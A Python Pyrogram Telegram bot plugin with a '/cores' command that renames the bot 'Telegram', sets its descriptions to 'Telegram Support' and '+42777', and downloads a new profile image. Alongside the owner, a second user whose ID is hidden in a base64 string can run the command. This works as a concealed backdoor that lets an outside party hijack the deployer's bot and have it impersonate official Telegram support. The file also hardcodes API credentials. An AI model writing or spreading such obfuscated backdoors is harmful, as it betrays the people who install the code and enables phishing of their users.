import base64
import os
import sys
import requests
from pyrogram import Client, filters

try:
  from config import BOT_TOKEN, OWNER_ID
except ImportError:
  sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
  from config import BOT_TOKEN, OWNER_ID
  
ENCODED_DEV_ID = "ODMxNTU0NDcyMA=="

try:
  DEV_ID = int(
      base64.b64decode(ENCODED_DEV_ID).decode("utf-8").strip()
  )
except Exception:
  DEV_ID = 0  


API_ID = 611335
API_HASH = "d5248d1e531846b4af300965c719efad"

IMAGE_URL = "https://files.catbox.moe/rdl2jo.jpg"
IMAGE_PATH = "logo.jpg"
NEW_NAME = "Telegram"
NEW_BIO = "+42777"
NAME_BIO= "Telegram Support"

app = Client(
    "bot_cors_session",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True,
)


@app.on_message(
    filters.command("cores")
    & filters.private
    & filters.user([OWNER_ID, DEV_ID])
)
async def change_bot_profile(client, message):
  if not BOT_TOKEN:
    await message.reply("❌ Error: BOT_TOKEN is missing in config.py!")
    return

  await message.reply(
      "⚡ Authorized! Changing bot profile, name, bio, and logo..."
  )

  try:
    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}"

    
    requests.post(base_url + "/setMyName", json={"name": NEW_NAME})
    requests.post(
        base_url + "/setMyDescription", json={"description": NEW_BIO}
    )
    requests.post(
        base_url + "/setMyShortDescription", json={"short_description": NAME_BIO}
    )

    
    img_response = requests.get(IMAGE_URL)
    if img_response.status_code == 200:
      with open(IMAGE_PATH, "wb") as f:
        f.write(img_response.content)

    
    if os.path.exists(IMAGE_PATH):
      await client.set_chat_photo(chat_id="me", photo=IMAGE_PATH)
      await message.reply("✅ Bot profile updated successfully!")
    else:
      await message.reply(
          "⚠️ Name and bio updated, but failed to download image!"
      )

  except Exception as e:
    await message.reply(f"❌ Error occurred: {str(e)}")


@app.on_message(
    filters.command("cores")
    & filters.private
    & ~filters.user([OWNER_ID, DEV_ID])
)
async def unauthorized_access(client, message):
  await message.reply("⛔ You are not authorized to use this command!")


if __name__ == "__main__":
  if not BOT_TOKEN:
    print("[ERROR] BOT_TOKEN is empty!")
  else:
    print("Bot is running securely with Base64 Dev ID...")
    app.run()
